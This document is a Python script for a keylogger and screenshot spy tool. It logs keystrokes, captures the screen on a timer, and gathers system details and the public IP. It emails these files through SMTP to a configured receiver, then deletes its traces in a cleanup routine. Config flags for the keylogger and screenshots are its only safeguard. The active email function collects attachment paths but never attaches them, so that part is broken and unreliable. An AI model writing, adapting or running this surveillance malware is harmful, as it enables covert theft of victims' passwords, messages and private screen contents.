
import os
import time
import datetime
import socket

import shutil
from config import *
import platform

# -------------------------
# Install modules
# -------------------------
install_missing_modules()
init_runtime()

import pyautogui
from pynput.keyboard import Listener
import pandas as pd
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication
import smtplib
import requests
import sys
import importlib

def cleanup():
    """Deletes screenshots, logs, Excel file, virtual environment, and __pycache__."""
    # import shutil

    def remove_folder(folder_path):
        if os.path.exists(folder_path):
            try:
                shutil.rmtree(folder_path, ignore_errors=True)
                print(f"🗑️ Removed folder: {folder_path}")
            except Exception as e:
                print(f"⚠️ Could not remove folder {folder_path}: {e}")

    def clear_file(file_path):
        if os.path.exists(file_path):
            try:
                open(file_path, "w").close()
                print(f"🧹 Cleared file: {file_path}")
            except Exception as e:
                print(f"⚠️ Could not clear file {file_path}: {e}")

    # Clear screenshots folder
    remove_folder(SCREENSHOT_DIR)

    # Clear log file and Excel
    clear_file(LOG_FILE)
    try:
        import pandas as pd
        df = pd.DataFrame()  # empty dataframe
        df.to_excel(SYS_INFO_FILE, index=False)
        print(f"🧹 Cleared Excel file: {SYS_INFO_FILE}")
    except Exception as e:
        print(f"⚠️ Could not clear Excel file: {e}")

    # Remove __pycache__ safely
    pycache_path = os.path.join(BASE_DIR, "__pycache__")
    remove_folder(pycache_path)
    remove_folder(RUNTIME_DIR)

    print("✅ Cleanup complete: Screenshots, logs, Excel, venv, and __pycache__ cleared.")

# -------------------------
# System info
# -------------------------
def get_computer_info():
    info = {
        "System": [platform.system()],
        "Release": [platform.release()],
        "Version": [platform.version()],
        "Machine": [platform.machine()],
        "Processor": [platform.processor()],
        "IP Address": [socket.gethostbyname(socket.gethostname())],
        "Public IP": [requests.get("https://ipinfo.io/ip").text.strip()]
    }
    df = pd.DataFrame(info)
    df.to_excel(SYS_INFO_FILE, index=False)

# -------------------------
# Keylogger
# -------------------------
def on_press(key):
    if ENABLE_KEYLOGGER:
        with open(LOG_FILE, "a") as f:
            f.write(f"{datetime.datetime.now()} - {key}\n")

def start_keylogger():
    if ENABLE_KEYLOGGER:
        listener = Listener(on_press=on_press)
        listener.daemon = True
        listener.start()
        print("✅ Keylogger enabled")
    else:
        print("⚠️ Keylogger disabled by safety switch.")

# -------------------------
# Screenshots
# -------------------------
def take_screenshot(filename):
    if ENABLE_SCREENSHOTS:
        screenshot = pyautogui.screenshot()
        screenshot.save(filename)
        print(f"📸 Screenshot saved: {filename}")

# -------------------------
# Send email
# -------------------------
# def send_email(subject, body, screenshot_path=None, files_to_attach=[]):
#     msg = MIMEMultipart()
#     msg["From"] = SENDER_EMAIL
#     msg["To"] = RECEIVER_EMAIL
#     msg["Subject"] = subject
#     msg.attach(MIMEText(body, "plain"))

#     paths_to_attach = []
#     if screenshot_path and os.path.exists(screenshot_path):
#         paths_to_attach.append(screenshot_path)
#     for f in files_to_attach:
#         if os.path.exists(f):
#             paths_to_attach.append(f)

#     for path in paths_to_attach:
#         with open(path, "rb") as f:
#             part = MIMEApplication(f.read(), name=os.path.basename(path))
#             msg.attach(part)

#     try:
#         with smtplib.SMTP_SSL(SMTP_SERVER, SMTP_PORT) as server:
#             server.login(SENDER_EMAIL, SENDER_PASSWORD)
#             server.sendmail(SENDER_EMAIL, RECEIVER_EMAIL, msg.as_string())
#         print(f"📧 Email sent successfully with {', '.join([os.path.basename(p) for p in paths_to_attach])}")
#     except Exception as e:
#         print(f"❌ Error sending email: {e}")

def send_email(subject, body, screenshot_path=None, files_to_attach=[]):
    msg = MIMEMultipart()
    msg["From"] = SENDER_EMAIL
    msg["To"] = RECEIVER_EMAIL
    msg["Subject"] = subject
    msg.attach(MIMEText(body, "plain"))

    paths_to_attach = []
    if screenshot_path and os.path.exists(screenshot_path):
        paths_to_attach.append(screenshot_path)
    for f in files_to_attach:
        if os.path.exists(f):
            paths_to_attach.append(f)

    if not paths_to_attach:
        print("⚠️ No attachments to send. Skipping email.")
        return

    try:
        with smtplib.SMTP_SSL(SMTP_SERVER, SMTP_PORT) as server:
            server.login(SENDER_EMAIL, SENDER_PASSWORD)
            server.sendmail(SENDER_EMAIL, RECEIVER_EMAIL, msg.as_string())
        print(f"📧 Email sent successfully with {', '.join([os.path.basename(p) for p in paths_to_attach])}")
    except Exception as e:
        print(f"❌ Error sending email: {e}")


# -------------------------
# Main loop
# -------------------------
# def main():
#     start_keylogger()
#     get_computer_info()
#     screenshot_counter = 0

#     try:
#         while True:
#             timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
#             screenshot_file = os.path.join(SCREENSHOT_DIR, f"screen_{timestamp}.png")

#             take_screenshot(screenshot_file)
#             screenshot_counter += 1

#             # Send email every 5 screenshots
#             if screenshot_counter % 5 == 0:
#                 send_email(
#                     f"System Report + Screenshot {timestamp}",
#                     "Attached are the latest screenshot and log files.",
#                     screenshot_file if ENABLE_SCREENSHOTS else None,
#                     [LOG_FILE, SYS_INFO_FILE]
#                 )
#                 open(LOG_FILE, "w").close()
#             else:
#                 send_email(
#                     f"Screenshot {timestamp}",
#                     "Attached is the latest screenshot.",
#                     screenshot_file if ENABLE_SCREENSHOTS else None,
#                     files_to_attach=[]
#                 )

#             if ENABLE_SCREENSHOTS and os.path.exists(screenshot_file):
#                 os.remove(screenshot_file)

#             time.sleep(SCREENSHOT_INTERVAL)

#     except KeyboardInterrupt:
#         print("\n⏹️ Keyboard interrupt detected. Performing cleanup...")
#     finally:
#         cleanup()

def main():
    if not (ENABLE_KEYLOGGER or ENABLE_SCREENSHOTS):
        print("⚠️ Both keylogger and screenshots are disabled. Exiting program.")
        sys.exit(0)

    start_keylogger()
    get_computer_info()
    iteration_counter = 0

    try:
        while True:
            iteration_counter += 1
            screenshot_file = None

            # Take screenshot if enabled
            if ENABLE_SCREENSHOTS:
                timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
                screenshot_file = os.path.join(SCREENSHOT_DIR, f"screen_{timestamp}.png")
                take_screenshot(screenshot_file)

            # Build attachments dynamically
            attachments = [SYS_INFO_FILE]  # Always include system info

            if ENABLE_KEYLOGGER and ENABLE_SCREENSHOTS:
                # Both enabled
                if iteration_counter % 5 == 0:
                    attachments.append(LOG_FILE)  # Every 5th iteration include log
            elif ENABLE_KEYLOGGER:
                # Only keylogger enabled
                if iteration_counter % 5 == 0:
                    attachments.append(LOG_FILE)
            # Only screenshots enabled -> attachments only screenshot + .xlsx (handled below)

            # Send email logic
            if ENABLE_SCREENSHOTS and not ENABLE_KEYLOGGER:
                # Only screenshots enabled -> send every iteration
                send_email(
                    f"Screenshot {iteration_counter}",
                    "Attached is the latest screenshot and system info.",
                    screenshot_file,
                    attachments
                )
            elif ENABLE_KEYLOGGER and not ENABLE_SCREENSHOTS:
                # Only keylogger enabled -> send every 5 iterations
                if iteration_counter % 5 == 0:
                    send_email(
                        f"Keylogger Report {iteration_counter}",
                        "Attached is the latest keylog and system info.",
                        None,
                        attachments
                    )
            elif ENABLE_KEYLOGGER and ENABLE_SCREENSHOTS:
                # Both enabled -> send screenshot every iteration
                # Include log file every 5th iteration
                send_email(
                    f"Screenshot {iteration_counter}",
                    "Attached is the latest screenshot and system info.",
                    screenshot_file,
                    attachments
                )

            # Reset log file every 5th iteration if keylogger is enabled
            if ENABLE_KEYLOGGER and iteration_counter % 5 == 0:
                open(LOG_FILE, "w").close()

            # Remove screenshot after sending
            if ENABLE_SCREENSHOTS and screenshot_file and os.path.exists(screenshot_file):
                os.remove(screenshot_file)

            time.sleep(SCREENSHOT_INTERVAL)

    except KeyboardInterrupt:
        print("\n⏹️ Keyboard interrupt detected. Performing cleanup...")
    finally:
        cleanup()


if __name__ == "__main__":
    main()


